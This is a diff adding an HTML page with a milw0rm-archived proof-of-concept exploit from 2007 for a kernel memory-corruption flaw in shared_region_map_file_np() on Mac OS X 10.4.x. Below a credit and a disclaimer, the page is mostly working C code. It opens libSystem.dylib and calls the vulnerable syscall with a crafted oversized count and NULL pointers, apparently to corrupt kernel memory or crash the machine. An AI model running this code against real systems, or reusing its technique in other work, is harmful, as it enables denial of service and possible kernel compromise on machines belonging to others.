@@ -1,0 +1,43 @@
+<html><head><title>Mac OS X 10.4.x Kernel shared_region_map_file_np() Memory Corruption</title></head><pre>/*
+This vulnerability was discovered by Adriano Lima
+&lt;adriano@risesecurity.org&gt;.
+
+REFERENCES
+
+[1] Mac OS X Internals: A Systems Approach By Amit Singh
+
+DISCLAIMER
+
+The authors reserve the right not to be responsible for the topicality,
+correctness, completeness or quality of the information provided in this
+document. Liability claims regarding damage caused by the use of any
+information
+provided, including any kind of information which is incomplete or
+incorrect,
+will therefore be rejected.
+*/
+
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc,char **argv){
+   int fd;
+
+   if((fd=open(&quot;/usr/lib/libSystem.dylib&quot;,O_RDONLY))==-1){
+       perror(&quot;open&quot;);
+       exit(EXIT_FAILURE);
+   }
+
+   if(syscall(SYS_shared_region_map_file_np,fd,0x02000000,NULL,NULL)==-1){
+       perror(&quot;shared_region_map_file_np&quot;);
+       exit(EXIT_FAILURE);
+   }
+
+   exit(EXIT_FAILURE);
+}
+
+// milw0rm.com [2007-01-21]</pre></html>
